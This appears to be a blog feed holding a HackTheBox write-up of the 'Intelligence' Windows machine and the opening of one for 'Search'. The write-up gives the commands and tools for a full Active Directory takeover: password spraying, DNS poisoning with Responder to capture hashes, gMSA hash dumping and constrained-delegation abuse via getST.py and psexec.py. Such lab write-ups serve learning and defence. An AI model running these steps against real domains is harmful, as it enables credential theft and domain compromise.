<p><img src="/assets/APT/dcsync-and-rooting-the-box.jpg" alt="dcsync-and-rooting-the-box" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Intelligence</title><link href="https://omnisl4sh.github.io/2022/07/01/Intelligence.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Intelligence" /><published>2022-07-01T00:00:00+02:00</published><updated>2022-07-01T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/07/01/Intelligence</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/07/01/Intelligence.html"><![CDATA[<p><img src="/assets/Intelligence/Intelligence.png" alt="Search" /></p>

<h3 id="summary">Summary</h3>
<ul>
  <li>A <strong>Windows Domain Controller</strong> that’s hosting a static website on port 80.</li>
  <li><em>While browsing the site,</em> we notice two links to <strong>PDF</strong> files that exist on a web directory for documents.</li>
  <li><em>When checking the naming of the</em> <strong>PDF</strong> <em>files,</em> we notice a date-based scheme. So, we make a list of file names to look for other documents.</li>
  <li>We find a lot of documents containing dummy text. Except for two which included information about a <strong>default password</strong> and about administrative activity going on as well as some hardening.</li>
  <li>We also get a list of usernames when inspecting the metadata of the files. We use those to spray the domain users which results in our first set of credentials (<code class="language-plaintext highlighter-rouge">Tiffany.Molina</code>).</li>
  <li><em>While checking Tiffany’s</em> <strong>SMB</strong> <em>share access,</em> we come across a <strong>PowerShell</strong> script on the <strong>“IT”</strong> share that routinely queries <strong>DNS</strong> for record names starting with <strong>“web”</strong> and issues <strong>authenticated</strong> web requests to them.</li>
  <li><em>Knowing this information,</em> we use a tool called <code class="language-plaintext highlighter-rouge">dnstool.py</code> from the <strong>Krbrelayx</strong> toolkit to add a record that starts with <strong>“web”</strong> and points to our Kali machine’s IP address.</li>
  <li><em>Having fired our</em> <code class="language-plaintext highlighter-rouge">responder</code> <em>to capture the</em> <strong>HTTP</strong> <em>request,</em> we wait for a couple of minutes and get the hash of a user called <code class="language-plaintext highlighter-rouge">ted.graves</code> who was running the script.</li>
  <li><em>After running a</em> <code class="language-plaintext highlighter-rouge">bloodhound</code> <em>collection and viewing exploit paths from the users we own,</em> we find that <strong>Ted</strong> can read the <strong>gMSA</strong> password of <code class="language-plaintext highlighter-rouge">SVC_INT</code> which has <strong>constrained delegation</strong> on the Domain Controller.</li>
  <li>We use the <code class="language-plaintext highlighter-rouge">gMSADumper</code> python tool to get the <strong>NTLM hash</strong> of <code class="language-plaintext highlighter-rouge">SVC_INT</code> and use it to request a <strong>silver ticket</strong> impersonating the <code class="language-plaintext highlighter-rouge">Administrator</code> for a full domain takeover.</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-30 20:31:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2022-06-30T20:32:35+00:00; +7h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2022-06-30T20:32:33+00:00; +7h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-06-30T20:32:35+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-06-30T20:32:33+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
51310/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time:
|   date: 2022-06-30T20:31:57
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
</code></pre></div></div>
<p><em>Viewing the port scan results,</em> we notice:</p>

<ol>
  <li>Standard Domain Controller ports: 53, 88, 389 &amp; 445</li>
  <li><strong>WinRM</strong> on port 5985 which is nice for shell access</li>
  <li><strong>IIS 10</strong> on Port 80 that we should take a look at</li>
  <li><em>On the last line,</em> the <strong>Clock Skew</strong> between our host and the DC is 7 hours (which is something we must take care of to make sure anything <strong>Kerberos-related</strong> works well)</li>
</ol>

<h3 id="the-website">The Website</h3>
<p><img src="/assets/Intelligence/website-homepage.jpg" alt="website-homepage" /></p>

<p>checking the website’s home page doesn’t show anything special. Except for this:</p>

<p><img src="/assets/Intelligence/document-links.jpg" alt="document-links" /></p>

<p><em>Upon clicking any of those links,</em> we get directed to a <strong>“documents”</strong> directory.</p>

<p>The content is some filler text. But we notice the naming of the documents is based on dates.</p>

<p><img src="/assets/Intelligence/document-naming.jpg" alt="document-naming" /></p>

<p>This is interesting because:</p>

<ul>
  <li>we want to see if there were <em>other documents</em></li>
  <li><em>And if there were,</em> we want to check their <strong>content</strong> as well as their <strong>metadata</strong></li>
</ul>

<p>we might get information we could use.</p>

<h3 id="searching-documents">Searching Documents</h3>
<p>We’re going to create a script that generates a list of <strong>PDF</strong> file names following the scheme we found.</p>

<p>We’ll make the script generate dates between 2018 to 2022. That’s 2 years before and after the date of the found documents.</p>

<p><strong>Note:</strong> This date range can take some time in the upcoming step. You can change it to be 2020 to 2021 if you just want to skip right to the solution. I’m only showing this because that’s what I did on my actual run :)</p>

<p><em>Since I am most comfortable with</em> <strong>PowerShell</strong> <em>and since it also runs on</em> <strong>Linux</strong>, I’m going to be using it.</p>

<p>Here’s the script:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">foreach</span><span class="p">(</span><span class="nv">$year</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">(</span><span class="mi">2018</span><span class="w"> </span><span class="o">..</span><span class="w"> </span><span class="mi">2022</span><span class="p">)){</span><span class="w">
	</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$month</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="o">..</span><span class="w"> </span><span class="mi">12</span><span class="p">)){</span><span class="w">
	        </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$month</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">10</span><span class="p">){</span><span class="nv">$month</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0</span><span class="nv">$month</span><span class="s2">"</span><span class="p">}</span><span class="w">   </span><span class="c"># if the month's number is less than 10, put a zero before it</span><span class="w">
	        </span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$day</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="o">..</span><span class="mi">31</span><span class="p">)){</span><span class="w">
	                </span><span class="kr">if</span><span class="p">(</span><span class="nv">$day</span><span class="w"> </span><span class="o">-lt</span><span class="w"> </span><span class="mi">10</span><span class="p">){</span><span class="nv">$day</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0</span><span class="nv">$day</span><span class="s2">"</span><span class="p">}</span><span class="w">  </span><span class="c"># if the day's number is less than 10, put a zero before it</span><span class="w">

	                </span><span class="s2">"</span><span class="nv">$year</span><span class="s2">-</span><span class="nv">$month</span><span class="s2">-</span><span class="nv">$day</span><span class="s2">-upload.pdf"</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">pdf_name_list.txt</span><span class="w"> </span><span class="c"># output the generated name into a text file</span><span class="w">
	        </span><span class="p">}</span><span class="w">
	</span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Which works like a charm :D</p>

<p><img src="/assets/Intelligence/pdf-name-generation.jpg" alt="pdf-name-generation" /></p>

<p>We create a specific folder for the <strong>PDF</strong>s and then write a quick <strong>bash</strong> loop to download every document it can find. we use <code class="language-plaintext highlighter-rouge">wget</code> with the <code class="language-plaintext highlighter-rouge">-q</code> flag to make it go quietly.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>doc <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>pdf_name_list.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span>wget <span class="nt">-q</span> <span class="s2">"http://10.10.10.248/documents/</span><span class="nv">$doc</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<p><img src="/assets/Intelligence/a-lot-of-pdfs.jpg" alt="a-lot-of-pdfs" /></p>

<p>The result is a large list of <strong>PDF</strong>s (99) from that process.</p>

<p>We wanted to find a tool to get us their content in text if possible. So we <strong>Googled</strong> for it:</p>

<p><img src="/assets/Intelligence/searching-for-pdf2text.jpg" alt="searching-for-pdf2text" /></p>

<p><img src="/assets/Intelligence/pdf2text-instructions.jpg" alt="pdf2text-instructions" /></p>

<p><em>After installing the package,</em> We’re going to use another <strong>bash</strong> script to create the converted text files.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>pdf <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> <span class="k">*</span>.pdf<span class="si">)</span><span class="p">;</span> <span class="k">do </span>pdftotext <span class="nv">$pdf</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<p>We end up with 99 text files that we need to browse through :D</p>

<p>Time for another script xD</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>text <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> <span class="k">*</span>.txt<span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nv">$text</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">'---------------------'</span><span class="p">;</span> <span class="nb">cat</span> <span class="nv">$text</span><span class="p">;</span> <span class="nb">echo</span> <span class="s1">'press any key to continue'</span><span class="p">;</span> <span class="nb">read</span><span class="p">;</span> <span class="k">done</span>
</code></pre></div></div>

<p>This displays the document names and allows you to browse each.</p>

<p>We find one interesting document: <code class="language-plaintext highlighter-rouge">2020-06-04-upload.txt</code></p>

<p><img src="/assets/Intelligence/second_note.jpg" alt="second_note" /></p>

<p>Which talks about changing the default password: <strong>“NewIntelligenceCorpUser9876”</strong> for new users after logging in.</p>

<p><em>If one of the users still has this password</em>, this could be our way of gaining access.</p>

<p>We also find another document: <code class="language-plaintext highlighter-rouge">2020-12-30-upload.txt</code></p>

<p><img src="/assets/Intelligence/first_note.jpg" alt="first_note" /></p>

<p>It talks about a user <code class="language-plaintext highlighter-rouge">ted</code> (<em>who’s probably in IT</em>) developing a <strong>script</strong> to notify people if a web server goes down.</p>

<p>And it also mentions <strong>“locking down service accounts”</strong> which hints at a <strong>possible security concern</strong> in that area.</p>

<h3 id="interesting-information-in-metadata">Interesting Information in Metadata</h3>
<p>Now we need a list of usernames..</p>

<p><em>With all those</em> <strong>PDF</strong>s <em>lying around,</em> we’re tempted to look for information in <strong>metadata.</strong></p>

<p>Our tool of choice is <code class="language-plaintext highlighter-rouge">exiftool</code></p>

<p>We do a quick sample test on one of the documents:</p>

<p><img src="/assets/Intelligence/creator-metada.jpg" alt="creator-metada" /></p>

<p>We find that there’s a <strong>Creator</strong> field with a possible username in it.</p>

<p>We use the tool with the <code class="language-plaintext highlighter-rouge">-creator</code> flag to only extract that field.</p>

<p>We couple this with some Shell Fu to create a user list:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>pdf <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> <span class="k">*</span>.pdf<span class="si">)</span><span class="p">;</span> <span class="k">do </span>exiftool <span class="nt">-creator</span> <span class="nv">$pdf</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s1">': '</span> <span class="s1">'{print $2}'</span><span class="p">;</span> <span class="k">done</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> userlist.txt
</code></pre></div></div>

<p><img src="/assets/Intelligence/exiftool-userlist.jpg" alt="exiftool-userlist" /></p>

<p>Clean! :D</p>

<p>We then validate those usernames using <a href="https://github.com/ropnop/kerbrute"><code class="language-plaintext highlighter-rouge">kerbrute</code></a></p>

<p><img src="/assets/Intelligence/kerbrute-userenum.jpg" alt="kerbrute-userenum" /></p>

<p>All 30 users were valid.</p>

<p><em>Before spraying them with the default password,</em> we gotta sync our time with the <strong>Domain Controller</strong> since we’re going to be doing <strong>Kerberos authentication</strong>.</p>

<p>A tool that automates that is <code class="language-plaintext highlighter-rouge">ntpdate</code>. But you have to disable the <strong>Automatic Time Feature</strong> in kali first using <code class="language-plaintext highlighter-rouge">timedatectl set-ntp off</code></p>

<p>We do this and we’re now in sync with the <strong>DC</strong> :]</p>

<p><img src="/assets/Intelligence/remove-clock-skew.jpg" alt="remove-clock-skew" /></p>

<p><img src="/assets/Intelligence/got-tiffany.jpg" alt="got-tiffany" /></p>

<p>Tiffany hadn’t changed the default password. Lucky for us :D</p>

<h3 id="exploiting-the-vulnerable-script">Exploiting the Vulnerable Script</h3>
<p><em>When checking the readable</em> <strong>SMB</strong> <em>shares as Tiffany,</em> we find that she can read a certain share: <strong>IT</strong></p>

<p><img src="/assets/Intelligence/smb-shares-tiffany.jpg" alt="smb-shares-tiffany" /></p>

<p>We connect to it using <code class="language-plaintext highlighter-rouge">smbclient</code> and find the script that the previous note was talking about:</p>

<p><img src="/assets/Intelligence/script.jpg" alt="script" /></p>

<p>When checking its content:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check web server status. Scheduled to run every 5min</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">ActiveDirectory</span><span class="w"> 
</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$record</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"web*"</span><span class="p">)</span><span class="w">  </span><span class="p">{</span><span class="w">
	</span><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
		</span><span class="nv">$request</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s2">"http://</span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-UseDefaultCredentials</span><span class="w">
		</span><span class="kr">if</span><span class="p">(</span><span class="o">.</span><span class="nf">StatusCode</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
			</span><span class="n">Send-MailMessage</span><span class="w"> </span><span class="nt">-From</span><span class="w"> </span><span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span><span class="w"> </span><span class="nt">-To</span><span class="w"> </span><span class="s1">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span><span class="w"> </span><span class="nt">-Subject</span><span class="w"> </span><span class="s2">"Host: </span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2"> is down"</span><span class="w">
		</span><span class="p">}</span><span class="w">
	</span><span class="p">}</span><span class="w">
	</span><span class="kr">catch</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>We can see that the script:</p>
<ul>
  <li>Runs every 5 minutes
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check web server status. Scheduled to run every 5min</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li>Looks for <strong>DNS</strong> records that start with <strong>“web”</strong>
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ChildItem</span><span class="w"> </span><span class="s2">"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="nx">Name</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s2">"web*"</span><span class="w">
</span></code></pre></div>    </div>
  </li>
  <li>Uses the credentials of the user running the script to issue web requests for every record match
    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="s2">"http://</span><span class="si">$(</span><span class="nv">$record</span><span class="o">.</span><span class="nf">Name</span><span class="si">)</span><span class="s2">"</span><span class="w"> </span><span class="nt">-UseDefaultCredentials</span><span class="w">
</span></code></pre></div>    </div>
  </li>
</ul>

<p><em>In order to exploit this,</em> we need to:</p>
<ol>
  <li>Find a way to put up a <strong>DNS</strong> record that points to our attacker machine</li>
  <li>Start a web server that can capture the <strong>NTLM authentication</strong> sent with the request</li>
</ol>

<p>The answers for both those challenges is <a href="/assets/Intelligence/https://github.com/dirkjanm/krbrelayx">dnstool.py</a> from the <strong>krbrelayx</strong> toolkit and <a href="https://github.com/SpiderLabs/Responder">responder</a></p>

<p><strong><code class="language-plaintext highlighter-rouge">dnstool.py</code></strong> lets us set a <strong>DNS</strong> record if we have valid domain credentials.</p>

<p>We check its help and upload a record that points to our <strong>Kali</strong></p>

<p><img src="/assets/Intelligence/dnstool-usage.jpg" alt="dnstool-usage" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">responder</code></strong> starts a <em>specially-setup</em> HTTP server that will capture the <strong>NTLMv2</strong> hash of the incoming request.</p>

<p>We will start it specifying our <strong>VPN</strong> tunnel interface: <code class="language-plaintext highlighter-rouge">responder -I tun0</code></p>

<p><em>After a few minutes,</em> we get an <strong>NTLMv2</strong> hash for the <code class="language-plaintext highlighter-rouge">Ted.Graves</code> user.</p>

<p><img src="/assets/Intelligence/captured-hash.jpg" alt="captured-hash" /></p>

<p>We could successfully crack it using <code class="language-plaintext highlighter-rouge">john</code></p>

<p><img src="/assets/Intelligence/teddys-hash-cracked.jpg" alt="teddys-hash-cracked" /></p>

<h3 id="bloodhound-and-the-path-to-domain-admin">Bloodhound and the Path to Domain Admin</h3>
<p><em>After running the</em> <strong>Bloodhound</strong> <em>python Ingestor</em> <a href="/assets/Intelligence/https://github.com/fox-it/BloodHound.py"><code class="language-plaintext highlighter-rouge">Bloodhound.py</code></a>, we mark our user <code class="language-plaintext highlighter-rouge">Ted.Graves</code> as owned.</p>

<p>We see a <strong>clear exploit path</strong> to <strong>Domain Admin</strong> when we view the results of the <code class="language-plaintext highlighter-rouge">Shortest Path from Owned Principals</code> built-in query:</p>

<p><img src="/assets/Intelligence/bloodhound-path-to-da.jpg" alt="bloodhound-path-to-da" /></p>

<ol>
  <li><strong>Ted</strong> can read the password for <code class="language-plaintext highlighter-rouge">SVC_INT$</code></li>
  <li><code class="language-plaintext highlighter-rouge">SVC_INT$</code> has <strong>Constrained Delegation</strong> over the Domain Controller (which we will talk about in the next section).</li>
</ol>

<p>Let’s first get the <strong>NTLM</strong> hash for the <code class="language-plaintext highlighter-rouge">SVC_INT$</code> group-managed service account.</p>

<p>we can do so using <a href="/assets/Intelligence/https://github.com/micahvandeusen/gMSADumper"><code class="language-plaintext highlighter-rouge">gMSADumper</code></a></p>

<p><img src="/assets/Intelligence/gMSADumped.jpg" alt="gMSADumped" /></p>

<p>We’re now good for the next step.</p>

<h3 id="abusing-constrained-delegation">Abusing Constrained Delegation</h3>
<p><em>In our case,</em> <code class="language-plaintext highlighter-rouge">SVC_INT$</code> is allowed delegation to the Domain Controller.</p>

<p>This means that it can <strong>impersonate any user</strong> (even Administrators) when interacting with the DC as the <strong>WWW</strong> service.</p>

<p>We know so by inspecting the account on <code class="language-plaintext highlighter-rouge">bloodhound</code></p>

<p><img src="/assets/Intelligence/allowed-to-delegate.jpg" alt="allowed-to-delegate" /></p>

<p><em>However, because the</em> <strong>service portion</strong> <em>in the granted</em> <strong>service ticket</strong> <em>is</em> <strong>unprotected</strong>, we may alter it for <strong>any service</strong> we want.</p>

<p><strong>For example:</strong> we can modify the received ticket to be for the <strong>LDAP</strong> service and be granted <strong>DCSync</strong> rights.</p>

<p>It was all mentioned on the <strong>Bloodhound</strong> help</p>

<p><img src="/assets/Intelligence/allowed-to-delegate-bh-help.jpg" alt="allowed-to-delegate-bh-help" /></p>

<p>Let’s go ahead and exploit this! :D</p>

<p>We will first request the ticket using <a href="https://github.com/SecureAuthCorp/impacket"><strong>impacket</strong></a>’s <code class="language-plaintext highlighter-rouge">getST.py</code> script</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getST.py -dc-ip 10.10.10.248 -spn 'WWW/dc.intelligence.htb' -impersonate administrator intelligence.htb/'svc_int$' -hashes :6bf735e60852b92212d512a4deadcfea
</code></pre></div></div>

<p><img src="/assets/Intelligence/getting-admin-ticket.jpg" alt="getting-admin-ticket" /></p>

<p>The ticket is now saved to disk. We’re going to export it to our environment and use it to own the box:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export KRB5CCNAME=&lt;path/to/ticket&gt;
psexec.py -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
</code></pre></div></div>

<p><img src="/assets/Intelligence/box-owned.jpg" alt="box-owned" /></p>

<p>Pretty sweet :D</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Hard] - Search</title><link href="https://omnisl4sh.github.io/2022/06/28/Search.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Search" /><published>2022-06-28T00:00:00+02:00</published><updated>2022-06-28T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/06/28/Search</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/06/28/Search.html"><![CDATA[<p><img src="/assets/Search/Search.png" alt="Search" /></p>

<h3 id="summary">Summary</h3>
<ul>
  <li>A <strong>Windows Domain Controller</strong> machine where we don’t get any access using conventional methods. The key to gaining our initial set of credentials is by inspecting <em>the images</em> on the website where one turns out to have <strong>credentials</strong> for a user called <code class="language-plaintext highlighter-rouge">hope.sharp</code></li>
  <li><em>Using this authenticated access,</em> we run a <strong>Kerberoast</strong> attack which gets us the hash of the <code class="language-plaintext highlighter-rouge">web_svc</code> account that we crack to get a password.</li>
  <li><em>When spraying this password across the domain users,</em> we find out that the password is also used by another user: <code class="language-plaintext highlighter-rouge">edgar.jacobs</code>.</li>
  <li>Edgar’s shared redirected folder was exposing his user profile which contained an interesting <strong>Microsoft Excel</strong> document called <code class="language-plaintext highlighter-rouge">Phishing_Attempt.xlsx</code>.</li>
  <li><em>When closely checking the contents of that document,</em> we find a <em>hidden</em> column which cannot be viewed because of the protection on the document.</li>
  <li>Uploading the Excel workbook to <strong>Google Sheets</strong> does the trick and shows us the hidden column which turned out to be a set of passwords.</li>
  <li>One of the passwords worked for a user called <code class="language-plaintext highlighter-rouge">sierra.frye</code> which had the permission to read the <strong>GMSA</strong> password of <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code>.</li>
  <li>The account <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> had a <code class="language-plaintext highlighter-rouge">WriteDACL</code> right on a <strong>Domain Administrator</strong> called <code class="language-plaintext highlighter-rouge">tristan.davies</code>.</li>
  <li>We use a python script to retrieve the <strong>NTLM</strong> hash of <code class="language-plaintext highlighter-rouge">BIR-ADFS-GMSA$</code> and abuse his rights to reset the password of <code class="language-plaintext highlighter-rouge">tristan.davies</code> via <strong>RPC.</strong></li>
  <li>Another route that is a bit longer includes using the <strong>PowerShell Web Access</strong> enabled on the web server after cracking then importing into our browser a <code class="language-plaintext highlighter-rouge">.pfx</code> certificate found on the shared user profile of the <code class="language-plaintext highlighter-rouge">sierra.frye</code> user.</li>
</ul>

<hr />

<h3 id="nmap">Nmap</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Search &amp;mdash; Just Testing IIS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-25 20:46:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
|_http-title: Search &amp;mdash; Just Testing IIS
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2022-06-25T20:48:22+00:00; 0s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-06-25T20:47:44
|_  start_date: N/A
</code></pre></div></div>

